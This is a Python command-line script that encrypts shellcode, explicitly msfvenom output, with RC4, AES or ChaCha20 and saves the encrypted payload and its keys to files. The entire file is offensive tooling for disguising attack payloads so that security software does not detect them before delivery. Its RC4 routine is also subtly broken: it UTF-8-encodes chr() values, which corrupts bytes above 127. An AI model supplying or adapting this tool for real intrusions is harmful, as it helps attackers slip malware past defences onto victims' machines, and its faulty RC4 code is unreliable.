import argparse
import os
import random
import string
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes
import base64

def generate_random_key(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def save_key_to_file(key_file, enc_type, keys):
    with open(key_file, 'w') as f:
        f.write(f"{enc_type}\n")
        for key in keys:
            f.write(base64.b64encode(key).decode() + '\n')

def read_shellcode(shellcode_file):
    with open(shellcode_file, 'rb') as f:
        return f.read()

def write_to_file(output_file, encoded_shellcode):
    with open(output_file, 'wb') as f:
        f.write(encoded_shellcode)

def rc4_encrypt(key, data):
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(chr(char ^ S[(S[i] + S[j]) % 256]))

    return ''.join(out).encode()

def aes_encrypt(key, data):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + tag + ciphertext

def chacha20_encrypt(key, data):
    cipher = ChaCha20.new(key=key)
    return cipher.nonce + cipher.encrypt(data)

def main():
    parser = argparse.ArgumentParser(description='Shellcode encoder using RC4, AES, or ChaCha20.')
    parser.add_argument('-k', '--key-file', required=True, help='File to save the encryption key')
    parser.add_argument('-s', '--shellcode', required=True, help='Input shellcode file (e.g., msfvenom output)')
    parser.add_argument('-o', '--output-file', required=True, help='Output file for encoded shellcode')
    parser.add_argument('--rc4', action='store_true', help='Use RC4 encryption')
    parser.add_argument('--aes', action='store_true', help='Use AES encryption')
    parser.add_argument('--chacha20', action='store_true', help='Use ChaCha20 encryption')

    args = parser.parse_args()

    # Read the shellcode
    shellcode = read_shellcode(args.shellcode)

    # Choose encryption type and generate key(s)
    if args.rc4:
        enc_type = 'RC4'
        key = generate_random_key(16).encode()  # RC4 key is typically 16 bytes
        encoded_shellcode = rc4_encrypt(key, shellcode)
        save_key_to_file(args.key_file, enc_type, [key])
    elif args.aes:
        enc_type = 'AES'
        key = get_random_bytes(16)  # AES key size is 16 bytes
        encoded_shellcode = aes_encrypt(key, shellcode)
        save_key_to_file(args.key_file, enc_type, [key])
    elif args.chacha20:
        enc_type = 'ChaCha20'
        key = get_random_bytes(32)  # ChaCha20 key size is 32 bytes
        encoded_shellcode = chacha20_encrypt(key, shellcode)
        save_key_to_file(args.key_file, enc_type, [key])
    else:
        print("You must specify an encryption type: --rc4, --aes, or --chacha20")
        return

    # Write the encoded shellcode to the output file
    write_to_file(args.output_file, encoded_shellcode)
    print(f"Shellcode encrypted with {enc_type} and written to {args.output_file}")

if __name__ == '__main__':
    main()
